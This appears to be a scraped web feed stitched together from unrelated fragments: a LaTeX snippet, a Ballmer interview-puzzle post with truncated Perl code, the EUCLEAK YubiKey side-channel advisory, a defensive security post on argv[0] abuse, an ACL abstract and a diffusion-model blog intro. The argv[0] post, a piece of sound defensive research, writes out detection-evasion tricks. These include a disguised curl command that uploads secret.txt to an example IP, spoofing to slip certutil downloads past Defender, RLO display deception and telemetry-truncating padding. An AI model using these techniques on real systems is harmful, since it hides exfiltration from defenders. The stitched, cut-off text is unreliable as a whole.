data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/6b8f138e-464c-4dbe-ad6e-205a514faeeb_616x400.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:400,&quot;width&quot;:616,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:13931,&quot;alt&quot;:&quot;&quot;,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null}" alt="" title="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6b8f138e-464c-4dbe-ad6e-205a514faeeb_616x400.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6b8f138e-464c-4dbe-ad6e-205a514faeeb_616x400.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6b8f138e-464c-4dbe-ad6e-205a514faeeb_616x400.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6b8f138e-464c-4dbe-ad6e-205a514faeeb_616x400.png 1456w" sizes="100vw" loading="lazy"></picture></div></a><figcaption>Diagram of shot i</figcaption></figure></div><p>Let's start by defining the hardcoded parameters of the game:</p><div data-component-name="Latex"><p><span>\(\begin{align}

&amp;\text{Let } S \in \mathbb{R}^+ \text{ be the speed of the ball}

\end{align*}\)</span></p></div><p>These are all the fixed inputs we provide to the solver.

<p>In this short video <a href="https://en.wikipedia.org/wiki/Steve_Ballmer">Steve Ballmer</a> talks about a puzzle question he would ask candidates interviewing at Microsoft. Solving it is based on <a href="https://en.wikipedia.org/wiki/Binary_search">binary search</a> and the <a href="https://en.wikipedia.org/wiki/Expected_value">expected value</a>.</p><p><iframe allowfullscreen="" height="266" src="https://www.youtube.com/embed/svCYbkS0Sjk" width="320" youtube-src-id="svCYbkS0Sjk"></iframe></p><p>Here's what he says: "<i>I'm thinking of a number between 1 and 100. You can guess, after each guess I'll tell you whether high or low. You get it the first guess I'll give you five bucks. Four bucks, three, two, one, zero, you pay me a buck, you pay me two, you pay me three</i>".&nbsp;</p><p>The question is "<i>Should you accept to play this game?</i>". In the interview, Ballmer states that the answer is "No" for two reasons: firstly, because he can pick numbers that'll be the most difficult for you to determine, secondly because the expected value of the game (assuming Ballmer chooses randomly) is negative: you end up paying Ballmer.</p><p>He's right on the first count. If you follow a binary search strategy (which will be optimal if he's choosing randomly) and he chooses one of&nbsp;2, 5, 8, 11, 14, 17, 20, 22, 24, 27, 30, 33, 36, 39, 42, 45, 47, 49, 52, 55, 58, 61, 64, 67, 70, 72, 74, 77, 80, 83, 85, 87, 90, 93, 96, 98 or 100 then you owe him $1. For all other numbers you get $0 (if he chose&nbsp;1, 4, 7, 10, 13, 16, 19, 23, 26, 29, 32, 35, 38, 41, 44, 48, 51, 54, 57, 60, 63, 66, 69, 73, 76, 79, 82, 86, 89, 92, 95 or 99) or a positive outcome (some of his money!).</p><p>In the video above Ballmer chooses 59 which a binary search strategy would have found in 5 steps resulting in the interviewer, Emily Chang, winning $1. She was actually pretty close to doing that. The binary search steps would be 50, 75,&nbsp;62, 56, 59 and she guessed 50, 75, 60, 55, 57, 58, 59.&nbsp;</p><p>On the second count (Baller implies the expected value is negative), if he's choosing randomly, then he's wrong. The expected value is $0.20 (calculated discretely using the code below). The code calculates the number of guesses for each value and an overall expected value assuming Ballmer chooses randomly.</p><p><span>use strict;<br></span><span>use warnings;<br></span><span><br>my @v = (0, 5, 4, 3, 2, 1, 0, -1, -2);<br></span><span><br>my $ev = 0;<br></span><span>my $ec = 0;<br></span><span><br>my @range = (1..100);<br></span><span><br>foreach my $r (@range) {<br></span><span>&nbsp; &nbsp; my $l = $range[0];<br></span><span>&nbsp; &nbsp; my $h = $range[$#range];<br></span><span><br>&nbsp; &nbsp; my $s = 0;<br></span><span>&nbsp; &nbsp; while (1) {<br></span><span>&nbsp; &nbsp; &nbsp; &nbsp; $s += 1;<br></span><span>&nbsp; &nbsp; &nbsp; &nbsp; my $g = int(($l + $h)/2);<br></span><span><br>&nbsp; &nbsp; &nbsp; &nbsp; if ($r == $g) {<br></span><span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print "$r found in $s steps (" . dollar($v[$s]) .

That's 0.2.</p><p><i>Why was Ballmer wrong?</i></p><p>One possibility is that he didn't mean to have the $0 for 6 guesses. If he'd said "<i>I'm thinking of a number between 1 and 100. You can guess, after each guess I'll tell you whether high or low. You get it the first guess I'll give you five bucks. Four bucks, three, two, one, you pay me a buck, you pay me two, you pay me three</i>" then the expected value is -$0.49.</p>

<h3>Abstract</h3>
<p><span> 
Secure elements are small microcontrollers whose main purpose is to generate/store secrets and then execute cryptographic operations. They undergo the highest level of security evaluations that exists (Common Criteria) and are often considered inviolable, even in the worst-case attack scenarios. Hence, complex secure systems build their security upon them.</span></p>

<p><span>
FIDO hardware tokens are strong authentication factors to sign in to applications (any web service supporting FIDO); they often embed a secure element and the FIDO protocol uses Elliptic Curve Digital Signature Algorithm (ECDSA for short) as its core cryptographic primitive. <tt>YubiKey 5 Series</tt> are certainly the most widespread FIDO hardware tokens, their secure element is an Infineon <tt>SLE78</tt>.</span></p>

<p><span>
This document shows how – finding a JavaCard open platform (the <tt>Feitian A22</tt>) based on a similar Infineon <tt>SLE78</tt> – we understood the Infineon ECDSA implementation, found a side-channel vulnerability and designed a practical side-channel attack. The attack is then demonstrated on a <tt>YubiKey 5Ci</tt>. Finally, we show that the vulnerability extends to the more recent Infineon <tt>Optiga Trust M</tt> and Infineon <tt>Optiga TPM</tt> security microcontrollers.</span></p>

<p><span>
Our work unearths a side-channel vulnerability in the cryptographic library of Infineon Technologies, one of the biggest secure element manufacturers. This vulnerability – that went unnoticed for 14 years and about 80 highest-level Common Criteria certification evaluations – is due to a non constant-time modular inversion.</span></p>

<p><span>
<b>The attack requires physical access to the secure element</b> (few local electromagnetic side-channel acquisitions, i.e. few minutes, are enough) <b>in order to extract the ECDSA secret key.</b> In the case of the FIDO protocol, this allows to create a clone of the FIDO device.</span></p>

<p><span>
<b>All <tt>YubiKey 5 Series</tt> (with firmware version below 5.7) are impacted by the attack and in fact all Infineon security microcontrollers (including TPMs) that run the Infineon cryptographic library (as far as we know, any existing version) are vulnerable to the attack.</b> These security microcontrollers are present in a vast variety of secure systems – often relying on ECDSA – like electronic passports and crypto-currency hardware wallets but also smart cars or homes. However, we did not check (yet) that the EUCLEAK attack applies to any of these products.</span></p>

<h3>Cautionary Note</h3>
<p><span> 
Authentication tokens (like FIDO hardware devices) primary goal is
 to fight the scourge of phishing attacks. The EUCLEAK attack requires physical access to
the device, expensive equipment, custom software and technical skills.<b> Thus, as far as the work presented here goes, it is still safer to use your YubiKey or other impacted products as FIDO hardware authentication token to sign in to applications rather than not using one.</b></span></p>

<h3>Discovered By</h3>
<p><span> Thomas Roche (NinjaLab)</span></p>

<h3>List of Impacted Products</h3>
<ul>
<li> All Infineon security microcontrollers embedding Infineon cryptographic library (any existing version). For instance, all existing versions of Infineon TPMs are affected. </li><br>
<li> All <tt>YubiKey 5 Series</tt> (with firmware version below 5.7) </li>
</ul>


<h3>Further Notes</h3>
<p><span>
1. The impacted Feitian A22 Javacard used in this work is an old product no more available for sale. All Feitian products currently available on their webstore (and based on an Infineon security microcontroller) use Feitian own cryptographic library, and are not impacted by our work to our knowledge.
</span></p>
<p><span>
2. The new YubiKey firmware 5.7 update (May 6th, 2024) switches the YubiKeys from Infineon cryptographic library to Yubico new cryptographic library. To our knowledge, this new cryptographic library is not impacted by our work.
</span></p>
<p><span>
3. Infineon has already a patch for their cryptographic library, to our knowledge it did not yet pass a Common Criteria certification evaluation.
</span></p>

<h3>CVE</h3>
<p><span> 
We are still waiting for a CVE ID.

            <description><![CDATA[<p>URL: <a href="https://www.wietzebeukema.nl/blog/why-bother-with-argv0">https://www.wietzebeukema.nl/blog/why-bother-with-argv0</a>, See on <a href="https://news.ycombinator.com/item?id=41434315">Hacker News</a></p>
<div id="readability-page-1" class="page"><article>
            <p>Command lines are weird. Windows is known for this [<a href="https://www.wietzebeukema.nl/blog/windows-command-line-obfuscation">1</a>], but as will become apparent, most operating systems implemented command lines in a way that can cause security issues. This post will set out, section by section, what’s wrong with this widely-adopted convention that the first argument of a process’ command line, often referred to as <code>argv[0]</code>, is reserved to represent the process’ name.</p>

<h2 id="argv0-is-a-relic-of-the-past"><code>argv[0]</code> is a relic of the past</h2>

<p>Whenever a program is started, it is provided with command-line arguments that are accessible from within the program - in fact, it is one of the first pieces of information that is made available when a program starts, and is a key mechanism for altering a program’s execution flow.</p>

<p>Consider the <code>exec</code> family of system calls as defined in POSIX [<a href="https://pubs.opengroup.org/onlinepubs/9699919799/functions/execve.html">2</a>], which is adopted by Unix-based systems as well as DOS/Win32 [<a href="https://learn.microsoft.com/en-us/cpp/c-runtime-library/exec-wexec-functions">3</a>]. For example, it defines function <code>execv</code> as:</p>

<div><pre><code><span>int</span> <span>execv</span><span>(</span><span>const</span> <span>char</span> <span>*</span><span>path</span><span>,</span> <span>char</span> <span>*</span><span>const</span> <span>argv</span><span>[]);</span>
</code></pre></div>

<p>Calling this function requires the full path of the application to be executed as <code>path</code> and a vector with arguments to be passed to the program as <code>argv</code>; it returns an integer with a status code. The same specification tells us that if a program is successfully executed as a result of this call, it will invoke the targeted program via</p>

<div><pre><code><span>int</span> <span>main</span> <span>(</span><span>int</span> <span>argc</span><span>,</span> <span>char</span> <span>*</span><span>argv</span><span>[]);</span>
</code></pre></div>

<p>Across all C standards [<a href="https://www.iso-9899.info/wiki/The_Standard">4</a>] we see that when a program is called like this, the following three conditions should hold true: <code>argc</code> is non-negative; <code>argv[argc]</code> is a null pointer; and if <code>argc</code> is greater than zero, the string pointed to by <code>argv[0]</code> represents the calling program’s name.</p>

<p>To some, that final condition may be a surprising one. The new process surely knows its own name, why does it need to be passed as the first process argument by the calling process? It is a design decision made to allow the created process to behave differently based on how it is called. Especially in a POSIX context, in which applications can be and frequently are symlinked, it gives the new process awareness of what the calling process was requesting, regardless of what symbolic links were followed. A practical example of this are the <code>shutdown</code> and <code>reboot</code> programs; on Debian, these are symlinked to the same <code>systemctl</code> executable. Depending on what command you call, the underlying process will behave differently.
Although I am not aware of any such real-life examples for Windows, which has much less of a symlink culture, its implementation allows for the same to be possible.</p>

<p>This seems like a questionable design decision. Should a program be allowed to behave differently based on its name? From a 2020s standpoint, this seems highly undesirable, as it makes software less predictable and goes against modern design principles. From a 1970s/1980s standpoint, a time when computer resources were scarce, it seems less unreasonable to attempt to minimise any form of duplication and redundancy. Today however, disk space is no longer considered an issue; this is evidenced by macOS Sonoma, where <code>shutdown</code> and <code>reboot</code> are two separate executables. Another argument against this design is that if you have two programs that are so similar that it pays off to consolidate them into a single file, is there really a need for two separate programs/program names? Is using <code>shutdown</code> and <code>reboot</code> so much more preferable than something along the lines of <code>power --shutdown</code> and <code>power --reboot</code>? Some will answer this with a straight “no”, whereas others argue single-word commands enhance user experience, and (especially a few decades ago) can offer cross-platform/backwards syntax compatibility using a shared code base. Even so, whether this solution is the best way of achieving that, remains doubtful.</p>

<p>Because even if you were to accept this principle, the implementation itself is debatable too. Why would one provide information on what program name was invoked as part of the process arguments, which are designed to be set by the calling process? Should the new process’s code actually rely on <code>argv[0]</code>, it is at the mercy of the process that called it to populate it correctly. Should this not be the case, it may break the new process; similarly, there are examples of programs relying on <code>argv[0]</code> in their process flows in incorrect or unsafe ways [<a href="https://effectivemachines.com/2018/05/03/fixing-apache-hadoop-cve-2016-6811-argv0-vs-security/">5</a>], leading to security issues.
Instead, separating out what is now <code>argv[0]</code> to its own <code>task_struct</code>/PEB feature would appear to be a more solid approach: other “metadata” such as the process’ path, current working directory, etc. are already kept here; it would allow for more consistent tracking and a reduced scope for manipulation. The operating system should be held responsible for populating the value, instead of expecting the calling program to do so.</p>

<p>The operating system that comes closest to doing this is, perhaps surprisingly, Windows. Unlike the other mainstream operating systems, Windows’ own API calls for creating new processes (such as <code>CreateProcess</code> [<a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa">6</a>], <code>ShellExecute</code> [<a href="https://learn.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shellexecutea">7</a>]) do not allow you to set <code>argv[0]</code>: it sets it for you, based on how the path to the executable was provided. Given how C expects <code>argv</code> to be populated, this is actually the most sensible implementation. Still, because of Windows’ adoption of the POSIX <code>exec</code> calls, there are still ways to manually set <code>argv[0]</code>.</p>

<p><a href="https://www.wietzebeukema.nl/assets/2024-09-03-windows-task-manager.png"><img src="https://www.wietzebeukema.nl/assets/2024-09-03-windows-task-manager.png" alt="Screenshot showing a Windows Task Manager window listing various command lines of running processes."></a>
<em>As <code>argv[0]</code> usually tells you how the program was called, on Windows it shows you if it was invoked via an absolute path (e.g. 1st highlight) or a relative one (e.g. 3rd highlight); what casing was used (e.g. 2nd highlight is upper case) and if it was wrapped in quotes (4th highlight).</em></p>

<h2 id="argv0-is-ignored-mostly"><code>argv[0]</code> is ignored (mostly)</h2>

<p>Regardless of your stance on <code>argv[0]</code>, the painted picture is our reality; <code>argv[0]</code> is a concept we will have to live with. As we will see, this does not come without trouble: when making <code>exec</code> calls, the first two of the aforementioned three conditions are taken care of by the implementing operating system; but the final condition concerning <code>argv[0]</code> is not. Since the caller of <code>exec</code> has full control over <code>argv</code>, it is possible to ignore this requirement. Since the operating system nor the calling program nor the called program are expected to check for violations of this requirement, overriding it can be done without consequences.</p>

<p>For example, to print <em>Hello, world!</em> with <code>echo</code>, the <strong><em>convention</em></strong> is to call e.g. <code>execv("/usr/bin/echo", ["echo", "Hello, world!"])</code>. However, executing <code>execv("/usr/bin/echo", ["oopsie", "Hello, world!"])</code> will also successfully call the <code>echo</code> program and print <em>Hello, world!</em> to its stdout, despite having <code>argv[0]</code> set to “oopsie”. Most likely, the <code>echo</code> program simply ignores whatever <code>argv[0]</code> is set to and solely focusses on <code>argv[1]</code> and beyond. In fact, this is an approach taken by most programs.</p>

<p>Calling an application with a manipulated <code>argv[0]</code> is, as this example shows, easy from within C. Other programming languages as well as some scripting languages also provide accessible interfaces to achieve this:</p>

<div><pre><code>python3 <span>-c</span> <span>"import os; os.execvp('/path/to/binary', ['ARGV0', '--other', '--args', '--here'])"</span>
perl <span>-e</span> <span>'exec {"/path/to/binary"} "ARGV0", "--other", "--args", "--here"'</span>
ruby <span>-e</span> <span>"exec(['/path/to/binary','ARGV0'],'--other', '--args', '--here')"</span>
bash <span>-c</span> <span>'exec -a "ARGV0" /path/to/binary --other --args --here'</span>
</code></pre></div>

<p>Thus, a key observation at this point is that manipulating <code>argv[0]</code> is straightforward and has no impact on most program executions. Yet, it has security implications, as we will see in the next three sections.</p>

<h2 id="argv0-can-break-defences"><code>argv[0]</code> can break defences</h2>

<p>First off, <code>argv[0]</code> can be used to fool security software. When a machine is compromised by a malicious user, it will typically manipulate the system in some way or another by running the attacker’s commands. Often, this takes the form of leveraging system-native commands. Defensive software such as <abbr title="Anti Virus">AV</abbr> and <abbr title="Endpoint Detection &amp; Response, commonly found in enterprise">EDR</abbr> monitor process executions, and detect or prevent specific ones if they are deemed harmful. Most solutions proactively look for commands commonly used by attackers (e.g. <a href="https://lolbas-project.github.io/">9</a>, <a href="https://gtfobins.github.io/">10</a>, <a href="https://www.loobins.io/">11</a>).</p>

<p>For example, the built-in <code>certutil</code> command-line tool on Windows is regularly seen in attacks [<a href="https://redcanary.com/threat-detection-report/techniques/ingress-tool-transfer/">12</a>] as a means to download an external payload after gaining an initial foothold. Windows’ pre-installed security software, Microsoft Defender Antivirus [<a href="https://learn.microsoft.com/en-us/defender-endpoint/microsoft-defender-antivirus-windows">13</a>], prevents <code>certutil</code> executions if it sees command-line arguments that suggest a file download is being attempted. As it turns out, the detection logic used by Defender is flawed: as the screenshot below shows, when starting <code>certutil</code> with <code>argv[0]</code> set to one or more spaces, Defender will not prevent the execution.</p>

<p><a href="https://www.wietzebeukema.nl/assets/2024-09-03-execvp-with-empty-argv0.png"><img src="https://www.wietzebeukema.nl/assets/2024-09-03-execvp-with-empty-argv0.png" alt="Screenshot showing a python execution triggering execvp(), calling certutil.exe without and with a manipulated argv[0] value."></a>
<em>Using <code>python</code> to emulate a <code>execvp</code> call, a screenshot showing Windows Defender blocking a <code>certutil</code> execution (first attempt), but not if <code>argv[0]</code> is set to a single space (second attempt).</em></p>

<p>Although perhaps not the most exciting of examples, it does highlight a wider issue: some detections rely on the program name being part of the command line. Let’s for argument’s sake pretend Defender’s detection logic here could be represented as <code>command_line.contains('certutil') AND command_line.contains('-urlcache')</code>. You can see how the first condition assumes <code>certutil</code> is part of the command line. Whilst this will be almost always the case for the <code>certutil</code> executions it is trying to find, our example shows a counter-example that successfully bypasses this command-line detection. For this reason, it is strongly recommended to structure detections in a way similar to <code>process_path.endswith('certutil.exe') AND command_line.contains('-urlcache')</code>, as experienced detection engineers are likely to do.</p>

<p>Another way in which detections may be bypassed is by adding tuning keywords to <code>argv[0]</code>. It is common for detections to have a base condition that is complemented by additional conditions that filter out false positive alerts. For example, you may have a detection rule that triggers when <code>attrib.exe</code> is used to hide a file [<a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/attrib">14</a>]. In practice, this happens often legitimately for file <code>desktop.ini</code>, so executions targetting this file may be tuned out [<a href="https://github.com/SigmaHQ/sigma/blob/782f0f524e6f797ea114fe0d87b22cb4abaa6b7c/rules/windows/process_creation/proc_creation_win_attrib_hiding_files.yml#L23-L24">15</a>]. If this is a known exclusion, an attacker could bypass such a detection by including <code>desktop.ini</code> in <code>argv[0]</code>, e.g. <code>argv = ['attrib_\desktop.ini', '+H', 'backdoor.exe']</code><sup id="fnref:i" role="doc-noteref"><a href="#fn:i" rel="footnote">1</a></sup>.</p>

<h2 id="argv0-can-deceive"><code>argv[0]</code> can deceive</h2>

<p>Another way in which <code>argv[0]</code> can be exploited, is by manipulating it in such a way that it fools <em>humans</em>. As discussed before, in enterprise settings, security analysts often review alerts generated by security tooling such as <abbr title="Endpoint Detection &amp; Response, commonly found in enterprise">EDR</abbr> software. Most of such alerts will include the process that is responsible for/associated with the activity that was flagged. The process’ command line is a key piece of information that analysts use to determine whether an alert should be further investigated, escalated, or ignored.</p>

<p>For example, an alert for possible data exfiltration might be triggered when <code>curl -T secret.txt 123.45.67.89</code> is executed [<a href="https://github.com/SigmaHQ/sigma/blob/782f0f524e6f797ea114fe0d87b22cb4abaa6b7c/rules/linux/process_creation/proc_creation_lnx_susp_curl_fileupload.yml">16</a>], as it uploads file <code>secret.txt</code> to IP address 123.45.67.89 via HTTP [<a href="https://explainshell.com/explain?cmd=curl+-T+secret.txt+123.45.67.89">17</a>]. A trained security analyst may further investigate this alert if this behaviour is rare in the environment. The fact that a hard-coded, external IP is used here might increase suspicion; especially if it was not seen before. With this in mind, attackers are more likely to be successful if they manage to make their activity “blend in” with normal activity, thus staying under the radar.</p>

<p>Now consider the same scenario, but with <code>argv[0]</code> changed from <code>curl</code> to <code>curl localhost | grep</code>. This may seem weird, but this is valid: as we have seen, in POSIX, process command lines are an array of strings<sup id="fnref:ii" role="doc-noteref"><a href="#fn:ii" rel="footnote">2</a></sup>, and its first element is nearly always ignored, so we can put in it whatever we want. What’s more, security software often represents the array as a space-separated string. Thus, in this case, it will most likely be represented as <code>curl localhost | grep -T secret.txt 123.45.67.89</code>, despite the arguments that are being passed being <code>['curl localhost | grep', '-T', 'secret.txt', '123.45.67.89']</code>.</p>

<p><a href="https://www.wietzebeukema.nl/assets/2024-09-03-curl-argv0-manipulation.svg"><img src="https://www.wietzebeukema.nl/assets/2024-09-03-curl-argv0-manipulation.svg" alt="Diagram showing a curl command line broken down by argv, and demonstrating how manipulation can result in an unexpected EDR output."></a>
<em>Diagram showing how changing <code>argv[0]</code> of a <code>curl</code> command can optically change what command is being executed.</em></p>

<p>To the human eye, it may now appear as if <code>curl localhost</code> is executed, and its output passed to <code>grep -T secret.txt 123.45.67.89</code>. Despite the latter not making much sense as a command, the command now has an entirely different meaning: it gives the impression <code>curl</code> is used to <em>download</em> information from a <em>local</em> address, even though in reality it is used to <em>upload</em> information to a <em>remote</em> address.</p>

<p><a href="https://www.wietzebeukema.nl/assets/2024-09-03-spoofed-command.jpg"><img src="https://www.wietzebeukema.nl/assets/2024-09-03-spoofed-command.jpg" alt="Screenshot showing the successful manipulation of a curl command by setting its argv[0] value to a deceiving value."></a>
<em>The first window shows the execution of the spoofed <code>curl</code> command, with a <code>htop</code> window below it showing it was successful. The window on the right represents the external server, showing the contents of <code>secrets.txt</code> were successfully exfiltrated.</em></p>

<p>Another deception example is the use of the infamous Right-To-Left Override (RLO) character [<a href="https://unicode-explorer.com/c/202E">18</a>, <a href="https://www.mozilla.org/en-US/security/advisories/mfsa2009-62/">19</a>]. The presence of this Unicode character will tell the rendering application to display the characters that follow in reverse order. Inserting the RLO at the end of <code>argv[0]</code> could therefore make <code>ping moc.elgoog.some-evil-website.com</code> look like <code>ping moc.etisbew-live-emos.google.com</code>. Whilst this will not affect detection logic (since it merely messes with how data is displayed), it may well deceive analysts.</p>

<p><a href="https://www.wietzebeukema.nl/assets/2024-09-03-powershell-rlo.jpg"><img src="https://www.wietzebeukema.nl/assets/2024-09-03-powershell-rlo.jpg" alt="Screenshot showing an 'obfuscated' PowerShell command line using the RLO character."></a>
<em>Invoking a PowerShell command that downloads and executes BloodHound, with <code>argv[0]</code> containing the RLO character <code>\u202E</code>, makes it much harder to understand what is going on when looking at the reported command line.</em></p>

<h2 id="argv0-can-corrupt-telemetry"><code>argv[0]</code> can corrupt telemetry</h2>

<p>Finally, there is another way in which <code>argv[0]</code> can raise issues, thanks to the remarkable fact that this often-ignored argument is at the very <strong><em>start</em></strong> of every command line. If you were to stuff <code>argv[0]</code> with enough characters, you will push all other arguments to the very end of the command line. This matters for two reasons: we could once again fool analysts by ‘hiding’ the interesting parts of the command line (hoping they don’t scroll to the very end), but more interestingly, if you make the total command line length long enough, the actually relevant arguments may get truncated by monitoring software.</p>

<p>Since Windows 7, the maximum length of a command line on Windows is 14,336 characters [<a href="https://devblogs.microsoft.com/oldnewthing/20031210-00/?p=41553">20</a>], which equates to 14 KiB; in the Linux kernel the maximum is hardcoded to 32 page sizes [<a href="https://github.com/torvalds/linux/blob/master/include/uapi/linux/binfmts.h#L9-L15">21</a>] which on 64-bit architecture typically works out as 131,072 characters (128 KiB), whereas macOS Sonoma allows command lines to span up to a whopping 1,048,576 characters (1 MiB). That is a lot of arbitrary space <code>argv[0]</code> could potentially fill up.</p>

<p>Process monitoring software like <abbr title="Endpoint Detection &amp; Response, commonly found in enterprise">EDR</abbr> might either log such long command-line executions in full, or it may truncate it at a fixed length to reduce overhead. In case of the former, it is easy to see how someone might generate 1GiB worth of logging data on macOS by simply starting 1,000 processes utilising the maximum command-line length. Should some form of truncation be applied, it will be possible to cut off command-line arguments from the telemetry: a command like <code>perl -e 'exec {"echo"} "_"x50000, "Hello, world!"'</code> will successfully output “Hello, world!”, but telemetry of the execution may just record a bunch of underscores, or in some cases even a completely empty command line. Thus, the relevant command-line arguments are not present, and detection logic as well as analysts will be blind to what is actually going on.</p>

<p><a href="https://www.wietzebeukema.nl/assets/2024-09-03-truncated-edr-entry.jpg"><img src="https://www.wietzebeukema.nl/assets/2024-09-03-truncated-edr-entry.jpg" alt="Screenshot showing EDR telemetry of a process event, demonstrating the command-line component was truncated."></a>
<em>Although the <code>echo</code> command executed successfully, the process telemetry ending up in this SQL-based data lake only contains spoofed <code>argv[0]</code> data and no actual command-line arguments, as data is truncated at 32,766 characters.</em></p>

<h2 id="argv0-considered-harmful-prevention-and-detection"><code>argv[0]</code> considered harmful: prevention and detection</h2>

<p>All in all, we see that in trying to solve one problem, the concept of <code>argv[0]</code> introduces several other problems. Since <code>argv[0]</code> won’t be going away anytime soon, it is worth focussing on how to deal with this from a security standpoint.</p>

<p>Although software developers could validate whether the passed <code>argv[0]</code> has been tampered with by comparing it with its own filename, it is a solution that doesn’t scale well, and as argued before, is something the operating system could do much more reliably. As relying on <code>argv[0]</code> for changing a program’s flow is also highly inadvisable, developers are best off not interacting with it at all.</p>

<p>For security professionals, awareness of how <code>argv[0]</code> works and what flaws it introduces is an important step in countering any command-line deception. This post aims to help in this regard. Furthermore, it may be possible to automatically detect some <code>argv[0]</code>-based bypasses. Should your security software provide command-line arguments as an array instead of a space-separated string, it should be possible to reliably identify some of the described patterns. Overly long <code>argv[0]</code> values or ones containing suspicious characters like the pipe character should instantly be flagged as suspicious. Even with command-line arguments presented as a string, it should be possible to flag command lines that do not contain the program’s name, which suggests it has been tampered with. The mere presence of an RLO character in a command line is in most environments a high-efficacy detection. For possibly truncated command-line arguments, make sure you understand how your security solution and data lake handle this and how it affects the generated telemetry; are single event entries capable of holding all command-line data, even when stretched to the maximum?</p>

<p>Finally, this post calls for defensive software to improve their detection of <code>argv[0]</code> abuse. Preventing software executions with suspicious <code>argv[0]</code> values should be possible without causing any false positives. <abbr title="Endpoint Detection &amp; Response, commonly found in enterprise">EDR</abbr> platforms should also consider leaving out <code>argv[0]</code> when reporting on command-line arguments, as this will eliminate nearly ever problem highlighted in this post; its forensic value is often minimal to none, or can be more reliably sourced from other process aspects.</p>

<p>Ultimately, nobody wants to be bothered by <code>argv[0]</code>. And neither should our software.</p>

Current methods for encoding such graphs typically either (i) linearize them for embedding with LMs – which underutilize structural information, or (ii) use Graph Neural Networks (GNNs) to preserve the graph structure – but GNNs cannot represent text features as well as pretrained LMs. In our work we introduce a novel LM type, the Graph Language Model (GLM), that integrates the strengths of both approaches and mitigates their weaknesses. The GLM parameters are initialized from a pretrained LM to enhance understanding of individual graph concepts and triplets. Simultaneously, we design the GLM’s architecture to incorporate graph biases, thereby promoting effective knowledge distribution within the graph. This enables GLMs to process graphs, texts, and interleaved inputs of both. Empirical evaluations on relation classification tasks show that GLM embeddings surpass both LM- and GNN-based baselines in supervised and zero-shot setting, demonstrating their versatility.</span></p></div><dl><dt>Anthology ID:</dt><dd>2024.acl-long.245</dd><dt>Volume:</dt><dd><a href="https://aclanthology.org/volumes/2024.acl-long/">Proceedings of the 62nd Annual Meeting of the Association for Computational Linguistics (Volume 1: Long Papers)</a></dd><dt>Month:</dt><dd>August</dd><dt>Year:</dt><dd>2024</dd><dt>Address:</dt><dd>Bangkok, Thailand</dd><dt>Editors:</dt><dd><a href="https://aclanthology.org/people/l/lun-wei-ku/">Lun-Wei Ku</a>,

      <p>A bit of signal processing swiftly reveals that diffusion models and autoregressive models aren’t all that different: <strong>diffusion models of images perform approximate autoregression in the frequency domain!</strong></p>

<p>
This blog post is also available as a <a href="https://colab.research.google.com/drive/1siywvhvl1OxI1UmqRrJHiFUK0M5SHlcx">Python notebook in Google Colab <img src="https://sander.ai/images/colab_logo.png"></a>, with the code used to produce all the plots and animations.</p>

<p>Last year, I wrote a blog post describing various different <a href="https://sander.ai/2023/07/20/perspectives.html">perspectives on diffusion</a>. The idea was to highlight a number of connections between diffusion models and other classes of models and concepts. In recent months, I have given a few talks where I discussed some of these perspectives. My talk at the <a href="https://www.eeml.eu/">EEML 2024 summer school</a> in Novi Sad, Serbia, was recorded and is <a href="https://www.youtube.com/watch?v=9BHQvQlsVdE">available on YouTube</a>. Based on the response I got from this talk, the link between diffusion models and <strong>autoregressive models</strong> seems to be particularly thought-provoking. That’s why I figured it could be useful to explore this a bit further.</p>

<p>In this blog post, I will unpack the above claim, and try to make it obvious that this is the case, at least for visual data. To make things more tangible, I decided to write this entire blog post in the form of <a href="https://colab.research.google.com/drive/1siywvhvl1OxI1UmqRrJHiFUK0M5SHlcx">a Python notebook</a> (using Google Colab). That way, <strong>you can easily reproduce the plots and analyses yourself</strong>, and modify them to observe what happens. I hope this format will also help drive home the point that this connection between diffusion models and autoregressive models is “real”, and not just a theoretical idealisation that doesn’t hold up in practice.</p>

<p>In what follows, I will assume a basic understanding of diffusion models and the core concepts behind them. If you’ve watched the talk I linked above, you should be able to follow along.

<p>Autoregression and diffusion are currently the two dominant generative modelling paradigms. There are many more ways to build generative models: <a href="https://en.wikipedia.org/wiki/Flow-based_generative_model">flow-based models</a> and <a href="https://en.wikipedia.org/wiki/Generative_adversarial_network">adversarial models</a> are just two possible alternatives (I discussed a few more in <a href="https://sander.ai/2020/03/24/audio-generation.html#generative-models">an earlier blog post</a>).</p>

<p>Both autoregression and diffusion differ from most of these alternatives, by splitting up the difficult task of generating data from complex distributions into smaller subtasks that are easier to learn. Autoregression does this by casting the data to be modelled into the shape of a sequence, and recursively predicting one sequence element at a time. Diffusion instead works by defining a corruption process that gradually destroys all structure in the data, and training a model to learn to invert this process step by step.</p>

<p>This <strong>iterative refinement</strong> approach to generative modelling is very powerful, because it allows us to construct very deep computational graphs for generation, without having to backpropagate through them during training. Indeed, both autoregressive models and diffusion models learn to perform a single step of refinement at a time – the generative process is not trained end-to-end. It is only when we try to sample from the model that we connect all these steps together, by sequentially performing the subtasks: predicting one sequence element after another in the case of autoregression, or gradually denoising the input step-by-step in the case of diffusion.</p>

